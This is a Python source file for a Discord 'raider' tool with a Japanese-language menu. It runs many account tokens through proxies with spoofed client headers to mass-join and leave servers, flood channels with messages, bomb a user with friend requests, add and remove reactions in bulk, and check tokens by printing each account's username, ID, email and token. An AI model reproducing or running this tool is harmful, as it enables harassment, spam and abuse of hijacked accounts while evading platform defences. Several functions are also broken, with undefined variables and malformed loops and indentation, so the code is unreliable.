import requests
import asyncio
import sys
import time
from colorama import Fore, Style
import threading
import os
import random
import json

def useragent():
	with open('useragent.txt', 'r') as f:
		ua = f.read().splitlines()
	return random.choice(ua)

tokens = open('tokens.txt','r').read().splitlines()
proxies = open('proxies.txt','r').read().splitlines()
proxies = [{'https':'http://'+proxy} for proxy in proxies]

with open("config.json", encoding='utf-8', errors='ignore') as f:
    configdata = json.load(f, strict=False)
config = configdata["Config"]


	
def Setup():
    os.system('cls')
    print(Fore.CYAN + 'CTKP-Raider Beta' + Fore.RESET)
    print(Fore.CYAN + '\n\n     1 >>' + Fore.RESET + ' 入室 (招待コード)' + Fore.RESET)
    print(Fore.CYAN + '\n\n     2 >>' + Fore.RESET + ' 離脱 (サーバーid)' + Fore.RESET)
    print(Fore.CYAN + '\n\n     3 >>' + Fore.RESET + ' スパマー (チャンネルID) (メッセージ) (量)' + Fore.RESET)
    print(Fore.CYAN + '\n\n     4 >>' + Fore.RESET + ' フレンド爆撃 (ユーザーID)' + Fore.RESET)
    print(Fore.CYAN + '\n\n     5 >>' + Fore.RESET + ' チェッカー')
    print(Fore.CYAN + '\n\n     6 >>' + Fore.RESET + ' 絵文字を付ける (絵文字つけるurl)')
    print(Fore.CYAN + '\n\n     7 >>' + Fore.RESET + ' 絵文字を消す (絵文字消すurl)')

def Start():
        command = list(input('\n\n   >> ').split(' '))
        if command[0] == "1":
                invite = command[1]
                threading.Thread(target=Join(invite)).start()
        if command[0] == "2":
                guildid = command[1]
                threading.Thread(target=Leave(guildid)).start()
        if command[0] == "3":
                channel = command[1]
                message = command[2]
                amount = command[3]
                threading.Thread(target=Spammer(channel, message, amount)).start()
        if command[0] == "4":
                userid = command[1]
                message = command[2]
                amount = command[3]
                threading.Thread(target=Friend(userid)).start()
        if command[0] == "5":
                threading.Thread(target=checker).start()
        if command[0] == "6":
                threading.Thread(target=putemoji(command[1])).start()
        if command[0] == "7":
                threading.Thread(target=deleteemoji(command[1])).start()
	

headers = {
        "user-agent": useragent(),
	"x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRmlyZWZveCIsImRldmljZSI6IiIsInN5c3RlbV9sb2NhbGUiOiJlbi1VUyIsImJyb3dzZXJfdXNlcl9hZ2VudCI6Ik1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQ7IHJ2OjkzLjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvOTMuMCIsImJyb3dzZXJfdmVyc2lvbiI6IjkzLjAiLCJvc192ZXJzaW9uIjoiMTAiLCJyZWZlcnJlciI6IiIsInJlZmVycmluZ19kb21haW4iOiIiLCJyZWZlcnJlcl9jdXJyZW50IjoiIiwicmVmZXJyaW5nX2RvbWFpbl9jdXJyZW50IjoiIiwicmVsZWFzZV9jaGFubmVsIjoic3RhYmxlIiwiY2xpZW50X2J1aWxkX251bWJlciI6MTAwODA0LCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsfQ==",
        "x-context-properties": "eyJsb2NhdGlvbiI6IkpvaW4gR3VpbGQiLCJsb2NhdGlvbl9ndWlsZF9pZCI6IjQyNDQ0NzAyMzc2NTUyMDM4NiIsImxvY2F0aW9uX2NoYW5uZWxfaWQiOiI2MDI3MDU3MzIzMzYzNTMyOTAiLCJsb2NhdGlvbl9jaGFubmVsX3R5cGUiOjB9",
	"sec-fetch-dest": "empty",
	"x-debug-options": "bugReporterEnabled",
	"sec-fetch-mode": "cors",
	"sec-fetch-site": "same-origin",
	"accept": "*/*",
	"accept-language": "en-GB",
	"TE": "trailers"
}

headers2 = {
    "accept": "*/*",
    "authority": "discord.com",
    "method": "POST",
    "scheme": "https",
    "origin": "discord.com",
    "referer": "discord.com/channels/@me",
    "x-debug-options": "bugReporterEnabled",
    "accept-language": "en-US,en;q=0.9",
    "connection": "keep-alive",
    "content-Type": "application/json",
    "user-agent": useragent(),
    "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAzIiwib3NfdmVyc2lvbiI6IjEwLjAuMjIwMDAiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiY2xpZW50X2J1aWxkX251bWJlciI6MTA0OTY3LCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsfQ==",
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-origin",
    "TE": "trailers"
}

def getcookie():
	r1 = requests.get("https://discord.com")
	cookie = r1.cookies.get_dict()
	cookie['locale'] = "us"
	return cookie

def getfingerprint():
	r2 = requests.get("https://discord.com/api/v9/experiments", headers=headers2).json()
	fingerprint = r2["fingerprint"]
	return fingerprint

def Join(invite):
    if config["proxy"] == True:
        for token in tokens:
                headers["authorization"] = token
                headers["x-fingerprint"] = getfingerprint()
                response = requests.post(f"https://discord.com/api/v9/invites/{invite}", headers=headers, cookies=getcookie(), proxies=proxies)
                print(response.status_code)
    else:
        for token in tokens:
                headers["authorization"] = token
                headers["x-fingerprint"] = getfingerprint()
                response = requests.post(f"https://discord.com/api/v9/invites/{invite}", headers=headers, cookies=getcookie())
                print(response.status_code)
        Setup()
        Start()
	
def Leave(guild):
    if config["proxy"] == True:
        for token in tokens:
                headers["authorization"] = token
                r = requests.delete(f"https://discord.com/api/v9/users/@me/guilds/{guild}",headers=headers,proxies=proxies, cookies=getcookie())
		if r.status_code == 200:
			print("抜けました")
		if r.status_code == 400:
			print("抜けれなかった...TOKENが無効かもそれかサーバーidが無効")
	
        Setup()
        Start()
    
	
	
	
def Spammer(channel, message, amount):
    if config["proxy"] == True:
        for token in tokens:
                for _ in range(int(amount)):
                        headers["authorization"] = token
                        response = requests.post(f"https://discord.com/api/v9/channels/{channel}/messages", headers=headers, cookies=getcookie(), proxies=proxies, json = {'content': message,'nonce':'','tts':False})
                        print(response.status_code)

    else:
        for token in tokens:
                for _ in range(int(amount)):
                        headers["authorization"] = token
                        response = requests.post(f"https://discord.com/api/v9/channels/{channel}/messages", headers=headers, cookies=getcookie(), json = {'content': message,'nonce':'','tts':False})
                        print(response.status_code)
        Setup()
        Start()

def Friend(userid):
    if config["proxy"] == True:
        for token in tokens:
                for _ in range(int(amount)):
                        headers["authorization"] = token
                        response = requests.put(f"https://discord.com/api/v9/users/@me/relationships/{userid}", headers=headers2, proxies=proxies, json = {})
                        print(response.status_code)

    else:
        for token in tokens:
                for _ in range(int(amount)):
                        headers["authorization"] = token
                        response = requests.post(f"https://discord.com/api/v9/users/@me/relationships/{userid}", headers=headers2, cookies=getcookie(), json = {})
                        print(response.status_code)
        Setup()
        Start()

def checker():
    if config["proxy"] == True:
        for token in token:
          header = {
			"authorization": token
		}
          userdata = requests.get("https://discord.com/api/v9/users/@me",headers=headers,proxies=proxies, cookies=getcookie()).json()
	  if r.status_code == 200:
		print(Fore.CYAN + f"<name>{userdata['username']}#{userdata['discriminator']} <id>{userdata['id']} <mail>{userdata['email']} <token>{token} <from>{userdata['locale']}" + Fore.RESET)
          if r.status_code == 400:
		print("404 not found TOKENが無効")
	Setup()
        Start()
	
	
def putemoji(url):
    if config["proxy"] == True:
        for token in token:
		r = requests.put(url,headers=headers,proxies=proxies, cookies=getcookie())
		if r.status_code == 200:
			print("行けた")
		if r.status_code == 400:
			print("サーバーかチャンネルかメッセージか絵文字が見つからなかった")
        Setup()
        Start()
	
def deleteemoji(url):
    if config["proxy"] == True:
	for token in token:
		r = requests.delete(url,headers=headers,proxies=proxy, cookies=getcookie())
		if r.status_code == 200:
			print("行けた")
		if r.status_code == 400:
			print("サーバーかチャンネルかメッセージか絵文字が見つからなかった")
        Setup()
        Start()
	
	
Setup()
Start()

